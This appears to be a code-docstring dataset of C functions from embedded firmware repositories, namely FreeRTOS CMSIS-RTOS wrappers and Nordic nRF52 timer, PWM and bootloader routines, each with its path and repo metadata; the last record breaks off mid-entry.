{"docstring": "/***************************  Signal Management ********************************/\n/**\n* @brief  Set the specified Signal Flags of an active thread.\n* @param  thread_id     thread ID obtained by \\ref osThreadCreate or \\ref osThreadGetId.\n* @param  signals       specifies the signal flags of the thread that should be set.\n* @retval previous signal flags of the specified thread or 0x80000000 in case of incorrect parameters.\n* @note   MUST REMAIN UNCHANGED: \\b osSignalSet shall be consistent in every CMSIS-RTOS.\n*/\n", "func_signal": "int32_t osSignalSet (osThreadId thread_id, int32_t signal)", "code": "{\n#if( configUSE_TASK_NOTIFICATIONS == 1 )\t\n  BaseType_t xHigherPriorityTaskWoken = pdFALSE;\n  uint32_t ulPreviousNotificationValue = 0;\n  \n  if (inHandlerMode())\n  {\n    if(xTaskGenericNotifyFromISR( thread_id , (uint32_t)signal, eSetBits, &ulPreviousNotificationValue, &xHigherPriorityTaskWoken ) != pdPASS )\n      return 0x80000000;\n    \n    portYIELD_FROM_ISR( xHigherPriorityTaskWoken );\n  }  \n  else if(xTaskGenericNotify( thread_id , (uint32_t)signal, eSetBits, &ulPreviousNotificationValue) != pdPASS )\n    return 0x80000000;\n  \n  return ulPreviousNotificationValue;\n#else\n  (void) thread_id;\n  (void) signal;\n\n  return 0x80000000; /* Task Notification not supported */ \t\n#endif\n}", "path": "Middlewares\\Third_Party\\FreeRTOS\\Source\\CMSIS_RTOS\\cmsis_os.c", "repo_name": "iwatake2222/DigitalCamera_STM32", "stars": 152, "license": "None", "language": "c", "size": 6715}
{"docstring": "/**\n* @brief Free a memory block from a mail\n* @param  queue_id mail queue ID obtained with \\ref osMailCreate.\n* @param  mail     pointer to the memory block that was obtained with \\ref osMailGet.\n* @retval status code that indicates the execution status of the function.\n* @note   MUST REMAIN UNCHANGED: \\b osMailFree shall be consistent in every CMSIS-RTOS.\n*/\n", "func_signal": "osStatus osMailFree (osMailQId queue_id, void *mail)", "code": "{\n  if (queue_id == NULL) {\n    return osErrorParameter;\n  }\n  \n  return osPoolFree(queue_id->pool, mail);\n}", "path": "Middlewares\\Third_Party\\FreeRTOS\\Source\\CMSIS_RTOS\\cmsis_os.c", "repo_name": "iwatake2222/DigitalCamera_STM32", "stars": 152, "license": "None", "language": "c", "size": 6715}
{"docstring": "/**\n* @brief   Get current priority of an active thread.\n* @param   thread_id     thread ID obtained by \\ref osThreadCreate or \\ref osThreadGetId.\n* @retval  current priority value of the thread function.\n* @note   MUST REMAIN UNCHANGED: \\b osThreadGetPriority shall be consistent in every CMSIS-RTOS.\n*/\n", "func_signal": "osPriority osThreadGetPriority (osThreadId thread_id)", "code": "{\n#if (INCLUDE_uxTaskPriorityGet == 1)\n  if (inHandlerMode())\n  {\n    return makeCmsisPriority(uxTaskPriorityGetFromISR(thread_id));  \n  }\n  else\n  {  \n    return makeCmsisPriority(uxTaskPriorityGet(thread_id));\n  }\n#else\n  return osPriorityError;\n#endif\n}", "path": "Middlewares\\Third_Party\\FreeRTOS\\Source\\CMSIS_RTOS\\cmsis_os.c", "repo_name": "iwatake2222/DigitalCamera_STM32", "stars": 152, "license": "None", "language": "c", "size": 6715}
{"docstring": "/**\n* @brief  Release a Recursive Mutex\n* @param   mutex_id      mutex ID obtained by \\ref osRecursiveMutexCreate.\n* @retval  status code that indicates the execution status of the function.\n*/\n", "func_signal": "osStatus osRecursiveMutexRelease (osMutexId mutex_id)", "code": "{\n#if (configUSE_RECURSIVE_MUTEXES == 1)\n  osStatus result = osOK;\n \n  if (xSemaphoreGiveRecursive(mutex_id) != pdTRUE) \n  {\n    result = osErrorOS;\n  }\n  return result;\n#else\n\treturn osErrorResource;\n#endif\n}", "path": "Middlewares\\Third_Party\\FreeRTOS\\Source\\CMSIS_RTOS\\cmsis_os.c", "repo_name": "iwatake2222/DigitalCamera_STM32", "stars": 152, "license": "None", "language": "c", "size": 6715}
{"docstring": "/**\n* @brief  Resume execution of a suspended thread.\n* @param   thread_id   thread ID obtained by \\ref osThreadCreate or \\ref osThreadGetId.\n* @retval  status code that indicates the execution status of the function.\n*/\n", "func_signal": "osStatus osThreadResume (osThreadId thread_id)", "code": "{\n#if (INCLUDE_vTaskSuspend == 1)  \n  if(inHandlerMode())\n  {\n    if (xTaskResumeFromISR(thread_id) == pdTRUE)\n    {\n      portYIELD_FROM_ISR(pdTRUE);\n    }\n  }\n  else\n  {\n    vTaskResume(thread_id);\n  }\n  return osOK;\n#else\n  return osErrorResource;\n#endif\n}", "path": "Middlewares\\Third_Party\\FreeRTOS\\Source\\CMSIS_RTOS\\cmsis_os.c", "repo_name": "iwatake2222/DigitalCamera_STM32", "stars": 152, "license": "None", "language": "c", "size": 6715}
{"docstring": "/**\n* @brief  Delay a task until a specified time\n* @param   PreviousWakeTime   Pointer to a variable that holds the time at which the \n*          task was last unblocked. PreviousWakeTime must be initialised with the current time\n*          prior to its first use (PreviousWakeTime = osKernelSysTick() )\n* @param   millisec    time delay value\n* @retval  status code that indicates the execution status of the function.\n*/\n", "func_signal": "osStatus osDelayUntil (uint32_t *PreviousWakeTime, uint32_t millisec)", "code": "{\n#if INCLUDE_vTaskDelayUntil\n  TickType_t ticks = (millisec / portTICK_PERIOD_MS);\n  vTaskDelayUntil((TickType_t *) PreviousWakeTime, ticks ? ticks : 1);\n  \n  return osOK;\n#else\n  (void) millisec;\n  (void) PreviousWakeTime;\n  \n  return osErrorResource;\n#endif\n}", "path": "Middlewares\\Third_Party\\FreeRTOS\\Source\\CMSIS_RTOS\\cmsis_os.c", "repo_name": "iwatake2222/DigitalCamera_STM32", "stars": 152, "license": "None", "language": "c", "size": 6715}
{"docstring": "/*************************** Additional specific APIs to Free RTOS ************/\n/**\n* @brief  Handles the tick increment\n* @param  none.\n* @retval none.\n*/\n", "func_signal": "void osSystickHandler(void)", "code": "{\n\n#if (INCLUDE_xTaskGetSchedulerState  == 1 )\n  if (xTaskGetSchedulerState() != taskSCHEDULER_NOT_STARTED)\n  {\n#endif  /* INCLUDE_xTaskGetSchedulerState */  \n    xPortSysTickHandler();\n#if (INCLUDE_xTaskGetSchedulerState  == 1 )\n  }\n#endif  /* INCLUDE_xTaskGetSchedulerState */  \n}", "path": "Middlewares\\Third_Party\\FreeRTOS\\Source\\CMSIS_RTOS\\cmsis_os.c", "repo_name": "iwatake2222/DigitalCamera_STM32", "stars": 152, "license": "None", "language": "c", "size": 6715}
{"docstring": "/**\n* @brief Create and Initialize a Semaphore object used for managing resources\n* @param semaphore_def semaphore definition referenced with \\ref osSemaphore.\n* @param count         number of available resources.\n* @retval  semaphore ID for reference by other functions or NULL in case of error.\n* @note   MUST REMAIN UNCHANGED: \\b osSemaphoreCreate shall be consistent in every CMSIS-RTOS.\n*/\n", "func_signal": "osSemaphoreId osSemaphoreCreate (const osSemaphoreDef_t *semaphore_def, int32_t count)", "code": "{ \n#if( configSUPPORT_STATIC_ALLOCATION == 1 ) && ( configSUPPORT_DYNAMIC_ALLOCATION == 1 )\n\n  osSemaphoreId sema;\n  \n  if (semaphore_def->controlblock != NULL){\n    if (count == 1) {\n      return xSemaphoreCreateBinaryStatic( semaphore_def->controlblock );\n    }\n    else {\n#if (configUSE_COUNTING_SEMAPHORES == 1 )\n      return xSemaphoreCreateCountingStatic( count, count, semaphore_def->controlblock );\n#else\n      return NULL;\n#endif\n    }\n  }\n  else {\n    if (count == 1) {\n      vSemaphoreCreateBinary(sema);\n      return sema;\n    }\n    else {\n#if (configUSE_COUNTING_SEMAPHORES == 1 )\t\n      return xSemaphoreCreateCounting(count, count);\n#else\n      return NULL;\n#endif    \n    }\n  }\n#elif ( configSUPPORT_STATIC_ALLOCATION == 1 ) // configSUPPORT_DYNAMIC_ALLOCATION == 0\n  if(count == 1) {\n    return xSemaphoreCreateBinaryStatic( semaphore_def->controlblock );\n  }\n  else\n  {\n#if (configUSE_COUNTING_SEMAPHORES == 1 )\n      return xSemaphoreCreateCountingStatic( count, count, semaphore_def->controlblock );\n#else\n      return NULL;\n#endif    \n  }\n#else  // configSUPPORT_STATIC_ALLOCATION == 0  && configSUPPORT_DYNAMIC_ALLOCATION == 1\n  osSemaphoreId sema;\n \n  if (count == 1) {\n    vSemaphoreCreateBinary(sema);\n    return sema;\n  }\n  else {\n#if (configUSE_COUNTING_SEMAPHORES == 1 )\t\n    return xSemaphoreCreateCounting(count, count);\n#else\n    return NULL;\n#endif\n  }\n#endif\n}", "path": "Middlewares\\Third_Party\\FreeRTOS\\Source\\CMSIS_RTOS\\cmsis_os.c", "repo_name": "iwatake2222/DigitalCamera_STM32", "stars": 152, "license": "None", "language": "c", "size": 6715}
{"docstring": "/**\n* @brief  Receive an item from a queue without removing the item from the queue.\n* @param  queue_id  message queue ID obtained with \\ref osMessageCreate.\n* @param  millisec  timeout value or 0 in case of no time-out.\n* @retval event information that includes status code.\n*/\n", "func_signal": "osEvent osMessagePeek (osMessageQId queue_id, uint32_t millisec)", "code": "{\n  TickType_t ticks;\n  osEvent event;\n  \n  event.def.message_id = queue_id;\n  \n  if (queue_id == NULL) {\n    event.status = osErrorParameter;\n    return event;\n  }\n  \n  ticks = 0;\n  if (millisec == osWaitForever) {\n    ticks = portMAX_DELAY;\n  }\n  else if (millisec != 0) {\n    ticks = millisec / portTICK_PERIOD_MS;\n    if (ticks == 0) {\n      ticks = 1;\n    }\n  }\n  \n  if (xQueuePeek(queue_id, &event.value.v, ticks) == pdTRUE) \n  {\n    /* We have mail */\n    event.status = osEventMessage;\n  }\n  else \n  {\n    event.status = (ticks == 0) ? osOK : osEventTimeout;\n  }\n  \n  return event;\n}", "path": "Middlewares\\Third_Party\\FreeRTOS\\Source\\CMSIS_RTOS\\cmsis_os.c", "repo_name": "iwatake2222/DigitalCamera_STM32", "stars": 152, "license": "None", "language": "c", "size": 6715}
{"docstring": "/**\n* @brief Get a mail from a queue\n* @param  queue_id   mail queue ID obtained with \\ref osMailCreate.\n* @param millisec    timeout value or 0 in case of no time-out\n* @retval event that contains mail information or error code.\n* @note   MUST REMAIN UNCHANGED: \\b osMailGet shall be consistent in every CMSIS-RTOS.\n*/\n", "func_signal": "osEvent osMailGet (osMailQId queue_id, uint32_t millisec)", "code": "{\n  portBASE_TYPE taskWoken;\n  TickType_t ticks;\n  osEvent event;\n  \n  event.def.mail_id = queue_id;\n  \n  if (queue_id == NULL) {\n    event.status = osErrorParameter;\n    return event;\n  }\n  \n  taskWoken = pdFALSE;\n  \n  ticks = 0;\n  if (millisec == osWaitForever) {\n    ticks = portMAX_DELAY;\n  }\n  else if (millisec != 0) {\n    ticks = millisec / portTICK_PERIOD_MS;\n    if (ticks == 0) {\n      ticks = 1;\n    }\n  }\n  \n  if (inHandlerMode()) {\n    if (xQueueReceiveFromISR(queue_id->handle, &event.value.p, &taskWoken) == pdTRUE) {\n      /* We have mail */\n      event.status = osEventMail;\n    }\n    else {\n      event.status = osOK;\n    }\n    portEND_SWITCHING_ISR(taskWoken);\n  }\n  else {\n    if (xQueueReceive(queue_id->handle, &event.value.p, ticks) == pdTRUE) {\n      /* We have mail */\n      event.status = osEventMail;\n    }\n    else {\n      event.status = (ticks == 0) ? osOK : osEventTimeout;\n    }\n  }\n  \n  return event;\n}", "path": "Middlewares\\Third_Party\\FreeRTOS\\Source\\CMSIS_RTOS\\cmsis_os.c", "repo_name": "iwatake2222/DigitalCamera_STM32", "stars": 152, "license": "None", "language": "c", "size": 6715}
{"docstring": "// System Timer available\n/*********************** Thread Management *****************************/\n/**\n* @brief  Create a thread and add it to Active Threads and set it to state READY.\n* @param  thread_def    thread definition referenced with \\ref osThread.\n* @param  argument      pointer that is passed to the thread function as start argument.\n* @retval thread ID for reference by other functions or NULL in case of error.\n* @note   MUST REMAIN UNCHANGED: \\b osThreadCreate shall be consistent in every CMSIS-RTOS.\n*/\n", "func_signal": "osThreadId osThreadCreate (const osThreadDef_t *thread_def, void *argument)", "code": "{\n  TaskHandle_t handle;\n  \n#if( configSUPPORT_STATIC_ALLOCATION == 1 ) &&  ( configSUPPORT_DYNAMIC_ALLOCATION == 1 )\n  if((thread_def->buffer != NULL) && (thread_def->controlblock != NULL)) {\n    handle = xTaskCreateStatic((TaskFunction_t)thread_def->pthread,(const portCHAR *)thread_def->name,\n              thread_def->stacksize, argument, makeFreeRtosPriority(thread_def->tpriority),\n              thread_def->buffer, thread_def->controlblock);\n  }\n  else {\n    if (xTaskCreate((TaskFunction_t)thread_def->pthread,(const portCHAR *)thread_def->name,\n              thread_def->stacksize, argument, makeFreeRtosPriority(thread_def->tpriority),\n              &handle) != pdPASS)  {\n      return NULL;\n    } \n  }\n#elif( configSUPPORT_STATIC_ALLOCATION == 1 )\n\n    handle = xTaskCreateStatic((TaskFunction_t)thread_def->pthread,(const portCHAR *)thread_def->name,\n              thread_def->stacksize, argument, makeFreeRtosPriority(thread_def->tpriority),\n              thread_def->buffer, thread_def->controlblock);\n#else\n  if (xTaskCreate((TaskFunction_t)thread_def->pthread,(const portCHAR *)thread_def->name,\n                   thread_def->stacksize, argument, makeFreeRtosPriority(thread_def->tpriority),\n                   &handle) != pdPASS)  {\n    return NULL;\n  }     \n#endif\n  \n  return handle;\n}", "path": "Middlewares\\Third_Party\\FreeRTOS\\Source\\CMSIS_RTOS\\cmsis_os.c", "repo_name": "iwatake2222/DigitalCamera_STM32", "stars": 152, "license": "None", "language": "c", "size": 6715}
{"docstring": "/* Convert from FreeRTOS priority number to CMSIS type osPriority */\n", "func_signal": "static osPriority makeCmsisPriority (unsigned portBASE_TYPE fpriority)", "code": "{\n  osPriority priority = osPriorityError;\n  \n  if ((fpriority - tskIDLE_PRIORITY) <= (osPriorityRealtime - osPriorityIdle)) {\n    priority = (osPriority)((int)osPriorityIdle + (int)(fpriority - tskIDLE_PRIORITY));\n  }\n  \n  return priority;\n}", "path": "Middlewares\\Third_Party\\FreeRTOS\\Source\\CMSIS_RTOS\\cmsis_os.c", "repo_name": "iwatake2222/DigitalCamera_STM32", "stars": 152, "license": "None", "language": "c", "size": 6715}
{"docstring": "/**\n* @brief Allocate a memory block from a memory pool and set memory block to zero\n* @param  pool_id       memory pool ID obtain referenced with \\ref osPoolCreate.\n* @retval  address of the allocated memory block or NULL in case of no memory available.\n* @note   MUST REMAIN UNCHANGED: \\b osPoolCAlloc shall be consistent in every CMSIS-RTOS.\n*/\n", "func_signal": "void *osPoolCAlloc (osPoolId pool_id)", "code": "{\n  void *p = osPoolAlloc(pool_id);\n  \n  if (p != NULL)\n  {\n    memset(p, 0, sizeof(pool_id->pool_sz));\n  }\n  \n  return p;\n}", "path": "Middlewares\\Third_Party\\FreeRTOS\\Source\\CMSIS_RTOS\\cmsis_os.c", "repo_name": "iwatake2222/DigitalCamera_STM32", "stars": 152, "license": "None", "language": "c", "size": 6715}
{"docstring": "/**\n* @brief Get a Message or Wait for a Message from a Queue.\n* @param  queue_id  message queue ID obtained with \\ref osMessageCreate.\n* @param  millisec  timeout value or 0 in case of no time-out.\n* @retval event information that includes status code.\n* @note   MUST REMAIN UNCHANGED: \\b osMessageGet shall be consistent in every CMSIS-RTOS.\n*/\n", "func_signal": "osEvent osMessageGet (osMessageQId queue_id, uint32_t millisec)", "code": "{\n  portBASE_TYPE taskWoken;\n  TickType_t ticks;\n  osEvent event;\n  \n  event.def.message_id = queue_id;\n  event.value.v = 0;\n  \n  if (queue_id == NULL) {\n    event.status = osErrorParameter;\n    return event;\n  }\n  \n  taskWoken = pdFALSE;\n  \n  ticks = 0;\n  if (millisec == osWaitForever) {\n    ticks = portMAX_DELAY;\n  }\n  else if (millisec != 0) {\n    ticks = millisec / portTICK_PERIOD_MS;\n    if (ticks == 0) {\n      ticks = 1;\n    }\n  }\n  \n  if (inHandlerMode()) {\n    if (xQueueReceiveFromISR(queue_id, &event.value.v, &taskWoken) == pdTRUE) {\n      /* We have mail */\n      event.status = osEventMessage;\n    }\n    else {\n      event.status = osOK;\n    }\n    portEND_SWITCHING_ISR(taskWoken);\n  }\n  else {\n    if (xQueueReceive(queue_id, &event.value.v, ticks) == pdTRUE) {\n      /* We have mail */\n      event.status = osEventMessage;\n    }\n    else {\n      event.status = (ticks == 0) ? osOK : osEventTimeout;\n    }\n  }\n  \n  return event;\n}", "path": "Middlewares\\Third_Party\\FreeRTOS\\Source\\CMSIS_RTOS\\cmsis_os.c", "repo_name": "iwatake2222/DigitalCamera_STM32", "stars": 152, "license": "None", "language": "c", "size": 6715}
{"docstring": "/**\n* @brief  Delete a timer.\n* @param  timer_id      timer ID obtained by \\ref osTimerCreate\n* @retval  status code that indicates the execution status of the function.\n* @note   MUST REMAIN UNCHANGED: \\b osTimerDelete shall be consistent in every CMSIS-RTOS.\n*/\n", "func_signal": "osStatus osTimerDelete (osTimerId timer_id)", "code": "{\nosStatus result = osOK;\n\n#if (configUSE_TIMERS == 1)\n\n   if (inHandlerMode()) {\n     return osErrorISR;\n  }\n  else { \n    if ((xTimerDelete(timer_id, osWaitForever )) != pdPASS) {\n      result = osErrorOS;\n    }\n  } \n    \n#else \n  result = osErrorOS;\n#endif \n \n  return result;\n}", "path": "Middlewares\\Third_Party\\FreeRTOS\\Source\\CMSIS_RTOS\\cmsis_os.c", "repo_name": "iwatake2222/DigitalCamera_STM32", "stars": 152, "license": "None", "language": "c", "size": 6715}
{"docstring": "// This code works in interrupt or not and handles overflow during reading.\n", "func_signal": "uint64_t common_rtc_64bit_ticks_get(void)", "code": "{\n    // Read the overflow counter, then the ticks.\n    volatile uint32_t overflows = m_common_rtc_overflows;\n    volatile uint32_t ticks     = nrf_rtc_counter_get(COMMON_RTC_INSTANCE);\n\n    // Make sure overflow interrupt can execute before rereading overflow\n    // counter, assuming interrupts are enabled.\n    __NOP();\n    __NOP();\n    // If overflow changes, then use new (one greater than last read).\n    // Interrupts must be enabled if overflow changes.\n    if (overflows != m_common_rtc_overflows)\n    {\n        // Tick counter should be 0 but we reread it anyway.\n        ticks = nrf_rtc_counter_get(COMMON_RTC_INSTANCE);\n        overflows++;\n    }\n    else\n    {\n        // If pending event, either just happened or interrupts are off.\n        // Either way, overflows go up by 1 and use new tick counter.\n        if (nrf_rtc_event_pending(COMMON_RTC_INSTANCE, NRF_RTC_EVENT_OVERFLOW))\n        {\n            // Since may have ints off, the tick counter may be greater than 0.\n            ticks = nrf_rtc_counter_get(COMMON_RTC_INSTANCE);\n            overflows++;\n        }\n    }\n    return (uint64_t)ticks + ((uint64_t)overflows << RTC_COUNTER_BITS);\n}", "path": "nRF52832\\arduino\\arduino-1.8.0\\hardware\\RBL\\RBL_nRF52832\\cores\\RBL_nRF52832\\mbed_os\\targets\\TARGET_NORDIC\\TARGET_NRF5\\us_ticker.c", "repo_name": "redbear/nRF5x", "stars": 181, "license": "None", "language": "c", "size": 22946}
{"docstring": "/**\n * @brief Function for calculating target timer frequency, which will allow to set given period length.\n *\n * @param[in] period_us       Desired period in microseconds.\n *\n * @retval    Timer frequency.\n */\n", "func_signal": "__STATIC_INLINE nrf_timer_frequency_t pwm_calculate_timer_frequency(uint32_t period_us)", "code": "{\n    uint32_t f   = (uint32_t) NRF_TIMER_FREQ_16MHz;\n    uint32_t min = (uint32_t) NRF_TIMER_FREQ_31250Hz;\n\n    while ((period_us > TIMER_MAX_PULSEWIDTH_US_ON_16M) && (f < min))\n    {\n        period_us >>= 1;\n        ++f;\n    }\n\n#ifdef NRF52\n    if ((m_use_ppi_delay_workaround) && (f == (uint32_t) NRF_TIMER_FREQ_16MHz))\n    {\n        f = (uint32_t) NRF_TIMER_FREQ_8MHz;\n    }\n#endif\n\n    return (nrf_timer_frequency_t) f;\n}", "path": "nRF52832\\arduino\\arduino-1.8.0\\hardware\\RBL\\RBL_nRF52832\\cores\\RBL_nRF52832\\mbed_os\\sdk\\libraries\\pwm\\app_pwm.c", "repo_name": "redbear/nRF5x", "stars": 181, "license": "None", "language": "c", "size": 22946}
{"docstring": "/**\n * @brief Function for initializing the PWM channel.\n *\n * @param[in] p_instance       PWM instance.\n * @param[in] channel          Channel number.\n * @param[in] pin              GPIO pin number.\n *\n * @retval    NRF_SUCCESS If initialization was successful.\n * @retval    NRF_ERROR_NO_MEM If there were not enough free resources.\n * @retval    NRF_ERROR_INVALID_STATE If the timer is already in use or initialization failed.\n */\n", "func_signal": "static ret_code_t app_pwm_channel_init(app_pwm_t const * const p_instance, uint8_t channel,\n                                     uint32_t pin, app_pwm_polarity_t polarity)", "code": "{\n    ASSERT(channel < APP_PWM_CHANNELS_PER_INSTANCE);\n    app_pwm_cb_t * p_cb = p_instance->p_cb;\n    app_pwm_channel_cb_t * p_channel_cb = &p_cb->channels_cb[channel];\n\n    if (p_cb->state != NRF_DRV_STATE_UNINITIALIZED)\n    {\n        return NRF_ERROR_INVALID_STATE;\n    }\n\n    p_channel_cb->pulsewidth = 0;\n    p_channel_cb->polarity   = polarity;\n    ret_code_t err_code;\n\n    /* GPIOTE setup: */\n    nrf_drv_gpiote_out_config_t out_cfg = GPIOTE_CONFIG_OUT_TASK_TOGGLE( POLARITY_INACTIVE(p_instance, channel) );\n    err_code = nrf_drv_gpiote_out_init((nrf_drv_gpiote_pin_t)pin,&out_cfg);\n    if (err_code != NRF_SUCCESS)\n    {\n        return NRF_ERROR_NO_MEM;\n    }\n    p_cb->channels_cb[channel].gpio_pin = pin;\n\n    // Set output to inactive state.\n    if (polarity)\n    {\n        nrf_gpio_pin_clear(pin);\n    }\n    else\n    {\n        nrf_gpio_pin_set(pin);\n    }\n\n    /* PPI setup: */\n    for (uint8_t i = 0; i < APP_PWM_REQUIRED_PPI_CHANNELS_PER_CHANNEL; ++i)\n    {\n        if (nrf_drv_ppi_channel_alloc(&p_channel_cb->ppi_channels[i]) != NRF_SUCCESS)\n        {\n            return NRF_ERROR_NO_MEM; // Resource de-allocation is done by callee.\n        }\n    }\n\n    nrf_drv_ppi_channel_disable(p_channel_cb->ppi_channels[0]);\n    nrf_drv_ppi_channel_disable(p_channel_cb->ppi_channels[1]);\n    nrf_drv_ppi_channel_assign(p_channel_cb->ppi_channels[0],\n                               nrf_drv_timer_compare_event_address_get(p_instance->p_timer, channel),\n                               nrf_drv_gpiote_out_task_addr_get(p_channel_cb->gpio_pin));\n    nrf_drv_ppi_channel_assign(p_channel_cb->ppi_channels[1],\n                               nrf_drv_timer_compare_event_address_get(p_instance->p_timer, PWM_MAIN_CC_CHANNEL),\n                               nrf_drv_gpiote_out_task_addr_get(p_channel_cb->gpio_pin));\n\n    p_channel_cb->initialized = APP_PWM_CHANNEL_INITIALIZED;\n    m_pwm_ready_counter[p_instance->p_timer->instance_id][channel] = 0;\n\n    return NRF_SUCCESS;\n}", "path": "nRF52832\\arduino\\arduino-1.8.0\\hardware\\RBL\\RBL_nRF52832\\cores\\RBL_nRF52832\\mbed_os\\sdk\\libraries\\pwm\\app_pwm.c", "repo_name": "redbear/nRF5x", "stars": 181, "license": "None", "language": "c", "size": 22946}
{"docstring": "/**\n * @brief PWM state transition from (0%, 100%) to 0% or 100%.\n *\n * @param[in] p_instance       PWM instance.\n * @param[in] channel          PWM channel number.\n * @param[in] ticks            Number of clock ticks.\n */\n", "func_signal": "static void pwm_transition_n_to_0or100(app_pwm_t const * const p_instance,\n                                       uint8_t channel, uint16_t ticks)", "code": "{\n    app_pwm_cb_t            * p_cb     = p_instance->p_cb;\n    app_pwm_channel_cb_t    * p_ch_cb  = &p_cb->channels_cb[channel];\n    nrf_ppi_channel_group_t   p_ppigrp = p_cb->ppi_group;\n\n    pwm_ppi_disable(p_instance);\n    nrf_drv_ppi_group_clear(p_ppigrp);\n    nrf_drv_ppi_channels_include_in_group(\n            nrf_drv_ppi_channel_to_mask(p_ch_cb->ppi_channels[0]) | \n            nrf_drv_ppi_channel_to_mask(p_ch_cb->ppi_channels[1]),\n            p_ppigrp);\n\n    if (!ticks)\n    {\n        nrf_drv_ppi_channel_assign(p_cb->ppi_channels[0],\n                    nrf_drv_timer_compare_event_address_get(p_instance->p_timer, channel),\n                    nrf_drv_ppi_task_addr_group_disable_get(p_ppigrp));\n        nrf_drv_timer_compare(p_instance->p_timer, (nrf_timer_cc_channel_t) PWM_SECONDARY_CC_CHANNEL, 0, false);\n        m_pwm_target_value[p_instance->p_timer->instance_id] =\n            nrf_drv_timer_capture_get(p_instance->p_timer, (nrf_timer_cc_channel_t) channel);\n        nrf_drv_ppi_channel_assign(p_cb->ppi_channels[1],\n                    nrf_drv_timer_compare_event_address_get(p_instance->p_timer, channel),\n                    nrf_drv_timer_capture_task_address_get(p_instance->p_timer, PWM_SECONDARY_CC_CHANNEL));\n    }\n    else\n    {\n        ticks = p_cb->period;\n        nrf_drv_ppi_channel_assign(p_cb->ppi_channels[0],\n                    nrf_drv_timer_compare_event_address_get(p_instance->p_timer, PWM_MAIN_CC_CHANNEL),\n                    nrf_drv_ppi_task_addr_group_disable_get(p_ppigrp));\n        // Set secondary CC channel to non-zero value:\n        nrf_drv_timer_compare(p_instance->p_timer, (nrf_timer_cc_channel_t) PWM_SECONDARY_CC_CHANNEL, 1, false);\n        m_pwm_target_value[p_instance->p_timer->instance_id] = 0;\n        // The captured value will be equal to 0, because timer clear on main PWM CC channel compare is enabled.\n        nrf_drv_ppi_channel_assign(p_cb->ppi_channels[1],\n                    nrf_drv_timer_compare_event_address_get(p_instance->p_timer, PWM_MAIN_CC_CHANNEL),\n                    nrf_drv_timer_capture_task_address_get(p_instance->p_timer, PWM_SECONDARY_CC_CHANNEL));\n    }\n    \n    nrf_drv_ppi_channel_enable(p_cb->ppi_channels[0]);\n    nrf_drv_ppi_channel_enable(p_cb->ppi_channels[1]);\n    \n    p_ch_cb->pulsewidth = ticks;\n    m_pwm_busy[p_instance->p_timer->instance_id] = PWM_SECONDARY_CC_CHANNEL;\n}", "path": "nRF52832\\arduino\\arduino-1.8.0\\hardware\\RBL\\RBL_nRF52832\\cores\\RBL_nRF52832\\mbed_os\\sdk\\libraries\\pwm\\app_pwm.c", "repo_name": "redbear/nRF5x", "stars": 181, "license": "None", "language": "c", "size": 22946}
{"docstring": "/**@brief Function for initialization of LEDs.\n */\n", "func_signal": "static void leds_init(void)", "code": "{\n    //nrf_gpio_range_cfg_output(LED_START, LED_STOP);\n    //nrf_gpio_pins_set(LEDS_MASK);\n    \n    nrf_gpio_cfg_output(UPDATE_IN_PROGRESS_LED);\n    nrf_gpio_pins_set(UPDATE_IN_PROGRESS_LED);\n    \n    nrf_gpio_cfg_output(DFU_BLINKY_BLEND2_LED);\n    nrf_gpio_cfg_output(DFU_BLINKY_NANO2_LED);\n    nrf_gpio_pins_set(DFU_BLINKY_BLEND2_LED);\n    nrf_gpio_pins_set(DFU_BLINKY_NANO2_LED);\n}", "path": "nRF52832\\dfu\\rbl_nrf52832_bootloader\\main.c", "repo_name": "redbear/nRF5x", "stars": 181, "license": "None", "language": "c", "size": 22946}
{"docstring": "/**\n * Returns the overflow flag of the alternative hardware timer.\n * @note This function is exposed by RTX kernel.\n * @return 1 if the timer has overflowed and 0 otherwise.\n */\n", "func_signal": "uint32_t os_tick_ovf(void)", "code": "{\n    uint32_t current_counter = nrf_rtc_counter_get(COMMON_RTC_INSTANCE);\n    uint32_t next_tick_cc_value = nrf_rtc_cc_get(COMMON_RTC_INSTANCE, OS_TICK_CC_CHANNEL);\n\n    return is_in_wrapped_range(previous_tick_cc_value, next_tick_cc_value, current_counter) ? 0 : 1;\n}", "path": "nRF52832\\arduino\\arduino-1.8.0\\hardware\\RBL\\RBL_nRF52832\\cores\\RBL_nRF52832\\mbed_os\\targets\\TARGET_NORDIC\\TARGET_NRF5\\us_ticker.c", "repo_name": "redbear/nRF5x", "stars": 181, "license": "None", "language": "c", "size": 22946}
{"docstring": "/**\n * @brief Function for disabling PWM PPI.\n *\n * @param[in] p_instance  PWM instance.\n */\n", "func_signal": "__STATIC_INLINE void pwm_ppi_disable(app_pwm_t const * const p_instance)", "code": "{\n    app_pwm_cb_t * p_cb = p_instance->p_cb;\n\n    nrf_drv_ppi_channel_disable(p_cb->ppi_channels[0]);\n    nrf_drv_ppi_channel_disable(p_cb->ppi_channels[1]);\n}", "path": "nRF52832\\arduino\\arduino-1.8.0\\hardware\\RBL\\RBL_nRF52832\\cores\\RBL_nRF52832\\mbed_os\\sdk\\libraries\\pwm\\app_pwm.c", "repo_name": "redbear/nRF5x", "stars": 181, "license": "None", "language": "c", "size": 22946}
{"docstring": "/**\n * Register the next tick.\n */\n", "func_signal": "static void register_next_tick()", "code": "{\n    previous_tick_cc_value = nrf_rtc_cc_get(COMMON_RTC_INSTANCE, OS_TICK_CC_CHANNEL);\n    uint32_t delta = get_next_tick_cc_delta();\n    uint32_t new_compare_value = (previous_tick_cc_value + delta) & MAX_RTC_COUNTER_VAL;\n\n    // Disable irq directly for few cycles,\n    // Validation of the new CC value against the COUNTER,\n    // Setting the new CC value and enabling CC IRQ should be an atomic operation\n    // Otherwise, there is a possibility to set an invalid CC value because\n    // the RTC1 keeps running.\n    // This code is very short 20-38 cycles in the worst case, it shouldn't\n    // disturb softdevice.\n    __disable_irq();\n    uint32_t current_counter = nrf_rtc_counter_get(COMMON_RTC_INSTANCE);\n\n    // If an overflow occur, set the next tick in COUNTER + delta clock cycles\n    if (is_in_wrapped_range(previous_tick_cc_value, new_compare_value, current_counter + 1) == false) {\n        new_compare_value = current_counter + delta;\n    }\n    nrf_rtc_cc_set(COMMON_RTC_INSTANCE, OS_TICK_CC_CHANNEL, new_compare_value);\n    // Enable generation of the compare event for the value set above (this\n    // event will trigger the interrupt).\n    nrf_rtc_event_enable(COMMON_RTC_INSTANCE, OS_TICK_INT_MASK);\n    __enable_irq();\n}", "path": 